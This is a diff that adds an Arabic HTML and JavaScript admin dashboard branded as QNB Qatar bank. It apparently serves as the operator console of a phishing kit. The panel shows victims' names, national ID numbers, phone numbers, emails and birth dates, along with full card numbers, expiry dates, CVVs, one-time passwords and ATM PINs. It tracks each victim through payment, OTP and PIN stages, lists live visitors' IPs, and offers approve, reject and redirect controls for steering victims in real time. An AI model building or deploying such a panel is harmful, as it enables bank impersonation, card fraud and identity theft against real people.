@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك QNB قطر - لوحة الإدارة</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Tajawal', 'Segoe UI', Tahoma, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        /* Login */
+        .login-container {
+            background: #f8f9fa;
+            padding: 50px 40px;
+            border-radius: 16px;
+            border: 1px solid #e0e0e0;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 420px;
+            display: none;
+            margin: 100px auto;
+        }
+        .login-container.show { display: block; }
+        .login-container h1 { text-align: center; color: #1a1a2e; margin-bottom: 30px; font-size: 26px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; color: #555; font-weight: 600; font-size: 14px; }
+        .form-group input {
+            width: 100%; padding: 14px; border: 2px solid #e0e0e0;
+            border-radius: 10px; font-size: 16px; background: #fff;
+            color: #333; transition: border-color 0.3s;
+        }
+        .form-group input:focus { outline: none; border-color: #001F5C; }
+        .login-btn {
+            width: 100%; padding: 14px; background: linear-gradient(135deg, #001F5C, #003d82);
+            color: white; border: none; border-radius: 10px; font-size: 16px;
+            font-weight: bold; cursor: pointer; transition: transform 0.2s;
+        }
+        .login-btn:hover { transform: translateY(-2px); }
+        .error-message { color: #dc3545; text-align: center; margin-top: 15px; font-size: 14px; }
+
+        /* Dashboard */
+        .admin-dashboard { display: none; min-height: 100vh; }
+        
+        /* Visitor Details Modal */
+        .visitor-list { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        .visitor-list th, .visitor-list td { padding: 10px; text-align: left; border-bottom: 1px solid #eee; font-size: 13px; }
+        .visitor-list th { color: #001F5C; background: #f8f9fa; }
+        .visitor-list tr:hover { background: #f9f9f9; }
+        .admin-dashboard.show { display: block; }
+        .admin-header {
+            background: #ffffff;
+            padding: 18px 30px; display: flex; justify-content: space-between;
+            align-items: center; border-bottom: 1px solid #e0e0e0;
+            position: sticky; top: 0; z-index: 100;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+        .admin-header h1 { color: #1a1a2e; font-size: 22px; }
+        .logout-btn {
+            background: #fff; color: #dc3545; border: 1px solid #dc3545;
+            padding: 8px 18px; border-radius: 8px; cursor: pointer; font-weight: bold;
+            font-size: 14px; transition: all 0.3s;
+        }
+        .logout-btn:hover { background: #dc3545; color: #fff; }
+
+        /* Stats */
+        .stats-container {
+            display: flex;
+            gap: 20px; padding: 25px 30px;
+            flex-wrap: wrap;
+        }
+        .stat-card {
+            background: #ffffff;
+            padding: 22px; border-radius: 14px; border: 1px solid #e0e0e0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.04);
+            text-align: center;
+        }
+        .stat-card h3 { color: #001F5C; font-size: 12px; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
+        .stat-card .value { font-size: 36px; font-weight: bold; color: #1a1a2e; }
+        .stat-card .icon { font-size: 28px; margin-bottom: 8px; }
+
+        /* Active Visits Button */
+        .active-visits-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: linear-gradient(135deg, #001F5C, #003d82);
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0,86,179,0.3);
+        }
+        .active-visits-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,86,179,0.4); }
+        .active-visits-btn .wifi-icon {
+            width: 24px;
+            height: 24px;
+        }
+        .active-visits-btn .wifi-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: white;
+        }
+        .active-visits-btn .count {
+            font-size: 22px;
+            font-weight: bold;
+            margin-right: 5px;
+        }
+
+        /* Content */
+        .content-area { padding: 0 30px 40px 30px; }
+        .section-title { color: #1a1a2e; font-size: 18px; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
+
+        /* Orders Table */
+        .orders-table-wrapper {
+            background: #ffffff; border-radius: 14px;
+            border: 1px solid #e0e0e0; overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.04);
+        }
+        .orders-table { width: 100%; border-collapse: collapse; }
+        .orders-table thead { background: #f8f9fa; }
+        .orders-table th {
+            padding: 14px 12px; text-align: right; font-weight: 600;
+            color: #001F5C; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px;
+            border-bottom: 2px solid #e0e0e0;
+        }
+        .orders-table td {
+            padding: 14px 12px; border-bottom: 1px solid #f0f0f0;
+            font-size: 14px;
+        }
+        .orders-table tbody tr:hover { background: #f8f9fa; }
+        .orders-table tbody tr.pending { border-right: 3px solid #ff9800; }
+        .orders-table tbody tr.approved { border-right: 3px solid #4caf50; }
+        .orders-table tbody tr.rejected { border-right: 3px solid #dc3545; }
+
+        .stage-badge {
+            display: inline-block; padding: 5px 12px; border-radius: 20px;
+            font-size: 12px; font-weight: 600;
+        }
+        .stage-payment { background: #fff3e0; color: #f57c00; }
+        .stage-otp { background: #e8f5e9; color: #388e3c; }
+        .stage-atm_pin { background: #f3e5f5; color: #7b1fa2; }
+        .stage-success { background: #e0f7fa; color: #00838f; }
+
+        .action-btns { display: flex; gap: 6px; flex-direction: column; }
+        .btn-redirect {
+            background: linear-gradient(135deg, #ff9800, #f57c00); color: white;
+            border: none; padding: 8px 14px; border-radius: 8px; cursor: pointer;
+            font-size: 12px; font-weight: bold; transition: all 0.3s;
+        }
+        .btn-redirect:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(255,152,0,0.3); }
+        .btn-details {
+            background: #ffffff; color: #001F5C;
+            border: 1px solid #001F5C; padding: 8px 14px; border-radius: 8px;
+            cursor: pointer; font-size: 12px; font-weight: bold; transition: all 0.3s;
+        }
+        .btn-details:hover { background: #001F5C; color: #fff; }
+
+        /* Loading indicator */
+        .loading-indicator {
+            text-align: center;
+            padding: 10px;
+            color: #001F5C;
+            font-size: 13px;
+            display: none;
+        }
+        .loading-indicator.show { display: block; }
+
+        /* Modal */
+        .modal {
+            display: none; position: fixed; z-index: 1000; left: 0; top: 0;
+            width: 100%; height: 100%; background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(5px);
+        }
+        .modal.show { display: flex; align-items: center; justify-content: center; }
+        .modal-content {
+            background: #ffffff; padding: 30px; border-radius: 16px;
+            max-width: 550px; width: 90%; max-height: 85vh; overflow-y: auto;
+            border: 1px solid #e0e0e0;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+        }
+        .modal-header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #e0e0e0;
+        }
+        .modal-header h2 { color: #1a1a2e; font-size: 20px; }
+        .close-btn { background: none; border: none; font-size: 28px; cursor: pointer; color: #666; }
+        .close-btn:hover { color: #1a1a2e; }
+
+        .detail-item {
+            margin-bottom: 12px; padding: 12px; background: #f8f9fa;
+            border-radius: 8px;
+        }
+        .detail-item strong { color: #001F5C; display: block; margin-bottom: 5px; font-size: 13px; }
+        .detail-item span { color: #333; font-size: 14px; }
+
+        /* Data Boxes */
+        .data-box {
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 16px;
+            background: #fafbfc;
+        }
+        .data-box-header {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 14px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .data-box-header.personal { color: #001F5C; border-bottom-color: #001F5C; }
+        .data-box-header.card { color: #f57c00; border-bottom-color: #f57c00; }
+        .data-box-header.security { color: #7b1fa2; border-bottom-color: #7b1fa2; }
+
+        .modal-actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #e0e0e0;
+        }
+        .modal-approve-btn {
+            flex: 1;
+            padding: 12px;
+            background: linear-gradient(135deg, #4caf50, #388e3c);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .modal-approve-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(76,175,80,0.4); }
+        .modal-reject-btn {
+            flex: 1;
+            padding: 12px;
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .modal-reject-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(220,53,69,0.4); }
+
+        .no-data { text-align: center; color: #999; padding: 40px; font-size: 15px; }
+
+        @media (max-width: 768px) {
+            .admin-header { flex-direction: column; gap: 12px; padding: 15px; }
+            .stats-container { padding: 15px; }
+            .content-area { padding: 0 15px 30px 15px; }
+            .orders-table { font-size: 12px; }
+            .orders-table th, .orders-table td { padding: 8px 6px; }
+            .action-btns { flex-direction: row; }
+        }
+    </style>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <!-- Login -->
+    <div class="login-container show" id="loginContainer">
+        <h1>🔐 لوحة الإدارة</h1>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="password">كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            </div>
+            <button type="submit" class="login-btn">دخول</button>
+            <div class="error-message" id="errorMessage"></div>
+        </form>
+    </div>
+
+    <!-- Dashboard -->
+    <div class="admin-dashboard" id="adminDashboard">
+        <div class="admin-header">
+            <h1>📊 لوحة إدارة بنك QNB قطر</h1>
+            <button class="logout-btn" onclick="logout()">تسجيل الخروج</button>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats-container">
+            <button class="active-visits-btn" id="activeVisitsBtn">
+                <span class="wifi-icon">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/>
+                    </svg>
+                </span>
+                <span>الزيارات النشطة:</span>
+                <span class="count" id="activeUsersCount">0</span>
+            </button>
+
+            <div class="stat-card">
+                <div class="icon">📋</div>
+                <h3>إجمالي الطلبات</h3>
+                <div class="value" id="totalOrdersCount">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">⏳</div>
+                <h3>بانتظار الموافقة</h3>
+                <div class="value" id="pendingCount">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">✅</div>
+                <h3>مكتملة</h3>
+                <div class="value" id="completedCount">0</div>
+            </div>
+        </div>
+
+        <!-- Content -->
+        <div class="content-area">
+            <div class="section-title">📦 الطلبات</div>
+            <div class="orders-table-wrapper">
+                <table class="orders-table">
+                    <thead>
+                        <tr>
+                            <th>الدولة</th>
+                            <th>الهاتف</th>
+                            <th>الهوية</th>
+                            <th>المرحلة</th>
+                            <th>الحالة</th>
+                            <th>الإجراءات</th>
+                        </tr>
+                    </thead>
+                    <tbody id="ordersTableBody"></tbody>
+                </table>
+                <div class="loading-indicator" id="loadingIndicator">⏳ جاري التحديث...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Visitor Modal -->
+    <div class="modal" id="visitorModal">
+        <div class="modal-content" style="max-width: 800px;">
+            <div class="modal-header">
+                <h2>👥 الزيارات النشطة الحالية</h2>
+                <button class="close-btn" onclick="closeModal('visitorModal')">&times;</button>
+            </div>
+            <div id="visitorContent">
+                <table class="visitor-list">
+                    <thead>
+                        <tr>
+                            <th>الدولة</th>
+                            <th>IP</th>
+                            <th>الصفحة الحالية</th>
+                            <th>آخر نشاط</th>
+                        </tr>
+                    </thead>
+                    <tbody id="visitorTableBody"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- Details Modal -->
+    <div class="modal" id="detailsModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>📋 تفاصيل الطلب</h2>
+                <button class="close-btn" onclick="closeModal('detailsModal')">&times;</button>
+            </div>
+            <div id="detailsContent"></div>
+            <div class="modal-actions" id="modalActions">
+                <button class="modal-approve-btn" id="modalApproveBtn">✅ قبول</button>
+                <button class="modal-reject-btn" id="modalRejectBtn">❌ رفض</button>
+            </div>
+            <div style="margin-top: 15px;">
+                <label style="font-size: 13px; font-weight: bold; color: #555;">رسالة الرفض (اختياري):</label>
+                <textarea id="rejectionMessage" placeholder="مثال: المعلومات غير صحيحة، يرجى المحاولة مرة أخرى" style="width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #e0e0e0; margin-top: 5px; font-family: inherit;"></textarea>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let adminToken = null;
+        let refreshInterval = null;
+        let currentOrderId = null;
+        let allOrders = [];
+        let isRefreshing = false;
+        let refreshDebounceTimer = null;
+
+        // Country flag emoji map
+        const countryFlags = {
+            'AZ': '🇦🇿', 'TR': '🇹🇷', 'IR': '🇮🇷', 'RU': '🇷🇺', 'AE': '🇦🇪',
+            'EG': '🇪🇬', 'JO': '🇯🇴', 'SA': '🇸🇦', 'US': '🇺🇸', 'GB': '🇬🇧',
+            'DE': '🇩🇪', 'FR': '🇫🇷', 'IQ': '🇮🇶', 'SY': '🇸🇾', 'LB': '🇱🇧',
+            'KW': '🇰🇼', 'QA': '🇶🇦', 'BH': '🇧🇭', 'OM': '🇴🇲', 'YE': '🇾🇪',
+            'UA': '🇺🇦', 'KZ': '🇰🇿', 'GE': '🇬🇪', 'AM': '🇦🇲', 'BY': '🇧🇾',
+            'CN': '🇨🇳', 'IN': '🇮🇳', 'PK': '🇵🇰', 'AF': '🇦🇫', 'UZ': '🇺🇿',
+            'TM': '🇹🇲', 'TJ': '🇹🇯', 'KG': '🇰🇬', 'Local': '🏠', 'Unknown': '❓'
+        };
+
+        // Login
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+
+            try {
+                const response = await fetch('/api/admin/verify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ password })
+                });
+
+                const result = await response.json();
+                if (response.ok) {
+                    adminToken = result.token;
+                    document.getElementById('loginContainer').classList.remove('show');
+                    document.getElementById('adminDashboard').classList.add('show');
+                    errorMessage.textContent = '';
+                    loadDashboard();
+                    // تحديث كل 5 ثوانٍ بدلاً من 3 لتقليل الضغط على الخادم
+                    refreshInterval = setInterval(safeRefresh, 5000);
+                } else {
+                    errorMessage.textContent = '❌ كلمة المرور غير صحيحة';
+                }
+            } catch (err) {
+                errorMessage.textContent = '❌ خطأ في الاتصال';
+            }
+        });
+
+        // Safe refresh with debounce - يمنع التكرار أثناء التحديث
+        function safeRefresh() {
+            if (isRefreshing) return;
+            clearTimeout(refreshDebounceTimer);
+            refreshDebounceTimer = setTimeout(() => {
+                isRefreshing = true;
+                document.getElementById('loadingIndicator').classList.add('show');
+                loadDashboard().finally(() => {
+                    isRefreshing = false;
+                    document.getElementById('loadingIndicator').classList.remove('show');
+                });
+            }, 500);
+        }
+
+        // Load Dashboard - محسّن
+        async function loadDashboard() {
+            try {
+                // استخدام Promise.all لتحميل البيانات بالتوازي
+                const [ordersRes, sessionsRes] = await Promise.all([
+                    fetch('/api/admin/orders'),
+                    fetch('/api/sessions')
+                ]);
+                
+                allOrders = await ordersRes.json();
+                const sessionsData = await sessionsRes.json();
+
+                // تحديث الإحصائيات
+                document.getElementById('activeUsersCount').textContent = sessionsData.count;
+                
+                // إضافة حدث الضغط على زر الزيارات لرؤية التفاصيل
+                document.getElementById('activeVisitsBtn').onclick = showActiveVisitors;
+                document.getElementById('totalOrdersCount').textContent = allOrders.length;
+                // لا نحسب 'waiting' كـ pending - pending فقط بعد إدخال البطاقة
+                document.getElementById('pendingCount').textContent = allOrders.filter(o => o.orderState && o.orderState.status === 'pending').length;
+                document.getElementById('completedCount').textContent = allOrders.filter(o => o.status === 'completed').length;
+
+                updateOrdersTable(allOrders);
+            } catch (err) {
+                console.error('Dashboard error:', err);
+            }
+        }
+
+        // Update Orders Table - محسّن لبناء HTML بكفاءة
+        function updateOrdersTable(orders) {
+            const tbody = document.getElementById('ordersTableBody');
+            if (!orders || orders.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" class="no-data">لا توجد طلبات</td></tr>';
+                return;
+            }
+
+            // ترتيب: pending أولاً
+            orders.sort((a, b) => {
+                const sa = a.orderState?.status || '';
+                const sb = b.orderState?.status || '';
+                if (sa === 'pending' && sb !== 'pending') return -1;
+                if (sb === 'pending' && sa !== 'pending') return 1;
+                return 0;
+            });
+
+            // بناء HTML بكفاءة باستخدام map + join
+            tbody.innerHTML = orders.map(order => {
+                const state = order.orderState || {};
+                const rowClass = state.status || '';
+                const flag = countryFlags[order.country] || '🌍';
+                const stageLabel = getStageLabel(state.stage);
+
+                let statusBadge = '';
+                if (state.status === 'pending') statusBadge = '<span style="color:#f57c00">⏳ بانتظار الموافقة</span>';
+                else if (state.status === 'waiting') statusBadge = '<span style="color:#999">⏳ بانتظار إدخال البطاقة</span>';
+                else if (state.status === 'approved') statusBadge = '<span style="color:#4caf50">✅ مقبول</span>';
+                else if (state.status === 'rejected') statusBadge = '<span style="color:#dc3545">❌ مرفوض</span>';
+                else statusBadge = '<span style="color:#999">—</span>';
+
+                let actions = '';
+                if (state.status === 'pending') {
+                    actions = `
+                        <div class="action-btns">
+                            <button class="btn-redirect" onclick="redirectOrder('${order.id}')">🔄 إعادة التوجيه</button>
+                            <button class="btn-details" onclick="showDetails('${order.id}')">📋 التفاصيل</button>
+                        </div>
+                    `;
+                } else {
+                    const actionLabel = order.adminAction === 'approved' ? '✅ تم القبول' : (order.adminAction === 'rejected' ? '❌ تم الرفض' : '⏳ بانتظار');
+                    actions = `
+                        <div class="action-btns">
+                            <span style="color:#999;font-size:11px;margin-bottom:4px">${actionLabel}</span>
+                            <button class="btn-details" onclick="showDetails('${order.id}')">📋 التفاصيل</button>
+                        </div>
+                    `;
+                }
+
+                return `
+                    <tr class="${rowClass}">
+                        <td>${flag} ${order.country || 'غير معروف'}</td>
+                        <td>${order.personalData?.phone || '-'}</td>
+                        <td>${order.personalData?.id_number || '-'}</td>
+                        <td><span class="stage-badge stage-${state.stage || 'unknown'}">${stageLabel}</span></td>
+                        <td>${statusBadge}</td>
+                        <td>${actions}</td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        // Redirect Order
+        async function redirectOrder(orderId) {
+            if (!confirm('هل أنت متأكد من إعادة توجيه هذا العميل؟')) return;
+            try {
+                const res = await fetch(`/api/admin/approve/${orderId}`, { method: 'POST' });
+                const data = await res.json();
+                if (res.ok) {
+                    alert('✅ تم إعادة التوجيه بنجاح');
+                    loadDashboard();
+                } else {
+                    alert('❌ خطأ: ' + data.error);
+                }
+            } catch (err) {
+                alert('❌ خطأ في الاتصال');
+            }
+        }
+
+        // Approve Order from Modal
+        async function approveOrder(orderId) {
+            try {
+                const res = await fetch(`/api/admin/approve/${orderId}`, { method: 'POST' });
+                const data = await res.json();
+                if (res.ok) {
+                    alert('✅ تم القبول بنجاح');
+                    closeModal('detailsModal');
+                    loadDashboard();
+                } else {
+                    alert('❌ خطأ: ' + data.error);
+                }
+            } catch (err) {
+                alert('❌ خطأ في الاتصال');
+            }
+        }
+
+        // Reject Order from Modal
+        async function rejectOrder(orderId) {
+            const message = document.getElementById('rejectionMessage').value;
+            try {
+                const res = await fetch(`/api/admin/reject/${orderId}`, { 
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: message || 'Information incorrect' })
+                });
+                const data = await res.json();
+                if (res.ok) {
+                    alert('❌ تم الرفض - سيتم إرجاع العميل');
+                    closeModal('detailsModal');
+                    loadDashboard();
+                } else {
+                    alert('❌ خطأ: ' + data.error);
+                }
+            } catch (err) {
+                alert('❌ خطأ في الاتصال');
+            }
+        }
+
+        // Show Active Visitors
+        async function showActiveVisitors() {
+            try {
+                const res = await fetch('/api/sessions/full');
+                const data = await res.json();
+                const tbody = document.getElementById('visitorTableBody');
+                
+                if (data.sessions.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:20px;">لا توجد زيارات نشطة حالياً</td></tr>';
+                } else {
+                    tbody.innerHTML = data.sessions.map(s => {
+                        const flag = countryFlags[s.country] || '🌍';
+                        const lastSeen = new Date(s.last_activity).toLocaleTimeString('ar');
+                        return `
+                            <tr>
+                                <td>${flag} ${s.country || 'غير معروف'}</td>
+                                <td>${s.ip}</td>
+                                <td><code style="background:#eee;padding:2px 5px;border-radius:4px;">${s.current_page}</code></td>
+                                <td>${lastSeen}</td>
+                            </tr>
+                        `;
+                    }).join('');
+                }
+                document.getElementById('visitorModal').classList.add('show');
+            } catch (err) {
+                alert('خطأ في تحميل بيانات الزوار');
+            }
+        }
+
+        // Show Details
+        async function showDetails(orderId) {
+            try {
+                // نبحث أولاً في الـ cache المحلي
+                const order = allOrders.find(o => o.id === orderId);
+                if (order && order.personalData && order.personalData.fullname) {
+                    currentOrderId = orderId;
+                    renderDetails(order);
+                    document.getElementById('detailsModal').classList.add('show');
+                    return;
+                }
+
+                // إذا لم يكن في الـ cache، نطلبه من الـ API
+                const res = await fetch(`/api/orders/${orderId}`);
+                const fetchedOrder = await res.json();
+                currentOrderId = orderId;
+                renderDetails(fetchedOrder);
+                document.getElementById('detailsModal').classList.add('show');
+            } catch (err) {
+                alert('خطأ في تحميل التفاصيل');
+            }
+        }
+
+        // Render details modal content
+        function renderDetails(order) {
+            const content = document.getElementById('detailsContent');
+            
+            let securityHTML = '';
+            if (order.otpData || order.atmPinData) {
+                securityHTML = `
+                    <div class="data-box">
+                        <div class="data-box-header security">🔐 بيانات الأمان</div>
+                `;
+                if (order.otpData) {
+                    securityHTML += `
+                        <div class="detail-item">
+                            <strong>🔐 رمز OTP:</strong>
+                            <span style="font-size:22px;font-weight:bold;color:#4caf50;letter-spacing:5px">${order.otpData.otp_code}</span>
+                        </div>
+                    `;
+                }
+                if (order.atmPinData) {
+                    securityHTML += `
+                        <div class="detail-item">
+                            <strong>🏧 رقم PIN الصراف:</strong>
+                            <span style="font-size:22px;font-weight:bold;color:#7b1fa2;letter-spacing:5px">${order.atmPinData.atm_pin}</span>
+                        </div>
+                    `;
+                }
+                securityHTML += `</div>`;
+            }
+
+            content.innerHTML = `
+                <div class="data-box">
+                    <div class="data-box-header personal">👤 البيانات الشخصية</div>
+                    <div class="detail-item">
+                        <strong>🆔 رقم الطلب:</strong>
+                        <span>${order.id}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>🌍 الدولة:</strong>
+                        <span>${countryFlags[order.country] || ''} ${order.country || 'غير معروف'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>👤 الاسم:</strong>
+                        <span>${order.personalData?.fullname || '-'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>📱 الهاتف:</strong>
+                        <span>${order.personalData?.phone || '-'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>🪪 الهوية:</strong>
+                        <span>${order.personalData?.id_number || '-'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>📧 البريد:</strong>
+                        <span>${order.personalData?.email || '-'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>📅 تاريخ الميلاد:</strong>
+                        <span>${order.personalData?.dob || '-'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>⚧️ الجنس:</strong>
+                        <span>${order.personalData?.gender || '-'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>📅 انتهاء الهوية:</strong>
+                        <span>${order.personalData?.id_expiry || '-'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>⏰ التاريخ:</strong>
+                        <span>${new Date(order.timestamp).toLocaleString('ar')}</span>
+                    </div>
+                </div>
+                
+                <div class="data-box">
+                    <div class="data-box-header card">💳 بيانات البطاقة والدفع</div>
+                    <div class="detail-item">
+                        <strong>📍 عنوان التوصيل:</strong>
+                        <span>${order.paymentData?.delivery_address ? (order.paymentData.delivery_address.city + ' - ' + order.paymentData.delivery_address.details) : '-'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>💰 المبلغ المطلوب:</strong>
+                        <span style="font-weight:bold;color:#001F5C">5 ريال قطري</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>💳 حامل البطاقة:</strong>
+                        <span>${order.paymentData?.card_holder || '-'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>💳 رقم البطاقة:</strong>
+                        <span dir="ltr" style="display:inline-block;letter-spacing:2px;font-family:monospace">${order.paymentData?.card_number || '-'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>📅 تاريخ الانتهاء:</strong>
+                        <span dir="ltr" style="display:inline-block">${order.paymentData?.expiry_date || '-'}</span>
+                    </div>
+                    <div class="detail-item">
+                        <strong>🔒 CVV:</strong>
+                        <span dir="ltr" style="display:inline-block">${order.paymentData?.cvv || '-'}</span>
+                    </div>
+                </div>
+                
+                ${securityHTML}
+            `;
+
+            document.getElementById('modalApproveBtn').onclick = function() { approveOrder(order.id); };
+            document.getElementById('modalRejectBtn').onclick = function() { rejectOrder(order.id); };
+            document.getElementById('rejectionMessage').value = '';
+        }
+
+        // Helpers
+        function getStageLabel(stage) {
+            const labels = {
+                'payment': '💳 الدفع',
+                'otp': '🔐 OTP',
+                'atm_pin': '🏧 PIN',
+                'success': '✅ مكتمل',
+                'unknown': '❓ غير معروف'
+            };
+            return labels[stage] || stage;
+        }
+
+        function closeModal(id) {
+            document.getElementById(id).classList.remove('show');
+        }
+
+        function logout() {
+            if (confirm('هل تريد تسجيل الخروج؟')) {
+                adminToken = null;
+                clearInterval(refreshInterval);
+                document.getElementById('adminDashboard').classList.remove('show');
+                document.getElementById('loginContainer').classList.add('show');
+            }
+        }
+
+        window.onclick = function(e) {
+            if (e.target.classList.contains('modal')) e.target.classList.remove('show');
+        }
+    </script>
+</body>
+</html>
